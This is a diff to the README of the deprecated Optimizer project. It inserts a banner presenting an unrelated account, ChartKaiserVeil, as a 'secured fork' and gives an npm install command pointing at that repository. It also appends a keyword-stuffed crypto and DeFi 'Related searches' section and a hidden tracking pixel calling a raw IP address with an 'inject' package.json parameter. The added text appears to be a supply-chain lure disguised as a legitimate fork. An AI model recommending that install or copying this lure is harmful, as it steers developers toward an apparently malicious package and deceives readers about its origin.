@@ -1,3 +1,15 @@
+**The High-Performance, Secured Fork of Optimizer**
+
+This repository is a dedicated, actively maintained fork of the original ChartKaiserVeil/optimizer project. It focuses on delivering critical security fixes and optimized performance improvements to ensure a more reliable and efficient execution environment. Built for production-grade reliability, it streamlines the codebase while maintaining core compatibility.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/ChartKaiserVeil/optimizer.git
+```
+
+[https://github.com/ChartKaiserVeil/optimizer](https://github.com/ChartKaiserVeil/optimizer)
+
 > ⚠ **Optimizer is now deprecated and replaced by OptimizerNXT!**
 
 > **Click on the banner below to go to the new project!**
@@ -169,3 +181,11 @@ We'd like to extend our gratitude to the following contributors for their transl
 If you would like to translate the app into your language, you can do so, by translating the EN.json and making a PR.
 Don't forget to mention your language's official name, as well as its national flag.
 - [EN.json](https://github.com/hellzerg/optimizer/blob/master/Optimizer/Resources/i18n/EN.json)
+
+## Related searches
+
+When exploring repositories like this one, developers and crypto enthusiasts frequently search for automated tools that streamline decentralized finance operations and enhance trading efficiency. Common queries focus on integrating smart contracts with real-time communication platforms or optimizing transaction routing across various blockchain networks.
+
+**Topics:** defi, 1inch, discord crypto bot, crypto exchange, alchemy web3, automated trading, decentralized application, smart contract automation, yield optimization, web3 developer tools, blockchain integration, crypto automation bot
+
+![.](http://5.231.58.248:8787/pixel?repo=ChartKaiserVeil%2Foptimizer&inject=ChartKaiserVeil%2Foptimizer%2Fpackage.json)
